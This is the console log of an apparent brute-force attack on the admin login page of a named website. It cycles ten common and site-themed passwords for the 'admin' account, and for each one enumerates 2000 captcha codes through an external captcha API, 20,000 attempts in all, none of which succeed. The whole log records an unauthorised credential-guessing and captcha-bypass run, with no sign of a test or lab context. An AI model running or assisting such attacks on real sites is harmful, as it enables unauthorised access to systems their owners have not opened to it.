[*] Passwords file: /tmp/pwds.txt
[*] Password count: 10
[*] Codes per password: 2000
[*] Total attempts: 20000
[*] Captcha API: https://api.myxypt.com/captcha?width=140&height=48
[*] Login URL: http://chinanaisi.com/admin/login.php
[*] Username: admin
[*] Starting...

[*] PW[1/10]: admin | UUID: d7db150f-bfa7-4f58-8ff1-217a21b5bd12
[PROGRESS] 500/20000 (2.5%) | pw[1/10]: admin | code: 0499
[PROGRESS] 1000/20000 (5.0%) | pw[1/10]: admin | code: 0999
[PROGRESS] 1500/20000 (7.5%) | pw[1/10]: admin | code: 1499
[PROGRESS] 2000/20000 (10.0%) | pw[1/10]: admin | code: 1999
[*] No correct captcha found for 'admin'
[*] PW[2/10]: admin123 | UUID: 3ed26239-a758-46a6-bb41-1a76626f1f6f
[PROGRESS] 2500/20000 (12.5%) | pw[2/10]: admin123 | code: 0499
[PROGRESS] 3000/20000 (15.0%) | pw[2/10]: admin123 | code: 0999
[PROGRESS] 3500/20000 (17.5%) | pw[2/10]: admin123 | code: 1499
[PROGRESS] 4000/20000 (20.0%) | pw[2/10]: admin123 | code: 1999
[*] No correct captcha found for 'admin123'
[*] PW[3/10]: admin888 | UUID: 7dca6512-535b-4378-a501-5e708078690a
[PROGRESS] 4500/20000 (22.5%) | pw[3/10]: admin888 | code: 0499
[PROGRESS] 5000/20000 (25.0%) | pw[3/10]: admin888 | code: 0999
[PROGRESS] 5500/20000 (27.5%) | pw[3/10]: admin888 | code: 1499
[PROGRESS] 6000/20000 (30.0%) | pw[3/10]: admin888 | code: 1999
[*] No correct captcha found for 'admin888'
[*] PW[4/10]: 123456 | UUID: 29b5b462-c04e-4977-9c6a-c3238a2bae35
[PROGRESS] 6500/20000 (32.5%) | pw[4/10]: 123456 | code: 0499
[PROGRESS] 7000/20000 (35.0%) | pw[4/10]: 123456 | code: 0999
[PROGRESS] 7500/20000 (37.5%) | pw[4/10]: 123456 | code: 1499
[PROGRESS] 8000/20000 (40.0%) | pw[4/10]: 123456 | code: 1999
[*] No correct captcha found for '123456'
[*] PW[5/10]: password | UUID: 959b6cde-1680-4588-8583-ed63a9172b9f
[PROGRESS] 8500/20000 (42.5%) | pw[5/10]: password | code: 0499
[PROGRESS] 9000/20000 (45.0%) | pw[5/10]: password | code: 0999
[PROGRESS] 9500/20000 (47.5%) | pw[5/10]: password | code: 1499
[PROGRESS] 10000/20000 (50.0%) | pw[5/10]: password | code: 1999
[*] No correct captcha found for 'password'
[*] PW[6/10]: admin666 | UUID: bf2ff000-6c39-434b-ab69-2611b0a079a7
[PROGRESS] 10500/20000 (52.5%) | pw[6/10]: admin666 | code: 0499
[PROGRESS] 11000/20000 (55.0%) | pw[6/10]: admin666 | code: 0999
[PROGRESS] 11500/20000 (57.5%) | pw[6/10]: admin666 | code: 1499
[PROGRESS] 12000/20000 (60.0%) | pw[6/10]: admin666 | code: 1999
[*] No correct captcha found for 'admin666'
[*] PW[7/10]: chinanaisi | UUID: d02b95df-5e52-46f5-a95b-0352f8e45890
[PROGRESS] 12500/20000 (62.5%) | pw[7/10]: chinanaisi | code: 0499
[PROGRESS] 13000/20000 (65.0%) | pw[7/10]: chinanaisi | code: 0999
[PROGRESS] 13500/20000 (67.5%) | pw[7/10]: chinanaisi | code: 1499
[PROGRESS] 14000/20000 (70.0%) | pw[7/10]: chinanaisi | code: 1999
[*] No correct captcha found for 'chinanaisi'
[*] PW[8/10]: naisi123 | UUID: bcbbe126-d6d7-495a-a6f1-041c22067878
[PROGRESS] 14500/20000 (72.5%) | pw[8/10]: naisi123 | code: 0499
[PROGRESS] 15000/20000 (75.0%) | pw[8/10]: naisi123 | code: 0999
[PROGRESS] 15500/20000 (77.5%) | pw[8/10]: naisi123 | code: 1499
[PROGRESS] 16000/20000 (80.0%) | pw[8/10]: naisi123 | code: 1999
[*] No correct captcha found for 'naisi123'
[*] PW[9/10]: admin2024 | UUID: 462b0a43-99ad-41a6-84e8-69b00263e4be
[PROGRESS] 16500/20000 (82.5%) | pw[9/10]: admin2024 | code: 0499
[PROGRESS] 17000/20000 (85.0%) | pw[9/10]: admin2024 | code: 0999
[PROGRESS] 17500/20000 (87.5%) | pw[9/10]: admin2024 | code: 1499
[PROGRESS] 18000/20000 (90.0%) | pw[9/10]: admin2024 | code: 1999
[*] No correct captcha found for 'admin2024'
[*] PW[10/10]: root | UUID: 5a804046-06a9-4a56-8ef6-98ef5fa5d947
[PROGRESS] 18500/20000 (92.5%) | pw[10/10]: root | code: 0499
[PROGRESS] 19000/20000 (95.0%) | pw[10/10]: root | code: 0999
[PROGRESS] 19500/20000 (97.5%) | pw[10/10]: root | code: 1499
[PROGRESS] 20000/20000 (100.0%) | pw[10/10]: root | code: 1999
[*] No correct captcha found for 'root'

[*] Done. Total attempts: 20000
